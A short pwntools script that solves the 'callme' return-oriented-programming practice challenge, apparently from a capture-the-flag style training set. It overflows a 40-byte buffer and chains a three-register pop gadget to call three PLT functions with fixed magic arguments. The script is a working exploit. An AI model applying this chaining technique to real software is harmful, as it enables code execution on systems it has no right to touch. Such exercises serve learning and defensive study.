from pwn import *

# Set up
elf = ELF("./callme")
rop = ROP(elf)
p = process("./callme")

# Get PLT addresses
callme_one = elf.plt["callme_one"]
callme_two = elf.plt["callme_two"]
callme_three = elf.plt["callme_three"]

# Find the correct gadget - pop rdi; pop rsi; pop rdx; ret
gadget = rop.find_gadget(["pop rdi", "pop rsi", "pop rdx", "ret"])[0]
ret = rop.find_gadget(["ret"])[0]

# Arguments (from the challenge description)
arg1 = 0xDEADBEEFDEADBEEF
arg2 = 0xCAFEBABECAFEBABE
arg3 = 0xD00DF00DD00DF00D

offset = 40

# Build payload
payload = b"A" * offset

# First call: callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
payload += p64(gadget)
payload += p64(arg1)
payload += p64(arg2)
payload += p64(arg3)
payload += p64(callme_one)

# Second call: callme_two(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
payload += p64(gadget)
payload += p64(arg1)
payload += p64(arg2)
payload += p64(arg3)
payload += p64(callme_two)

# Third call: callme_three(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
payload += p64(gadget)
payload += p64(arg1)
payload += p64(arg2)
payload += p64(arg3)
payload += p64(callme_three)

p.sendlineafter(b"> ", payload)
print(p.recvall().decode())
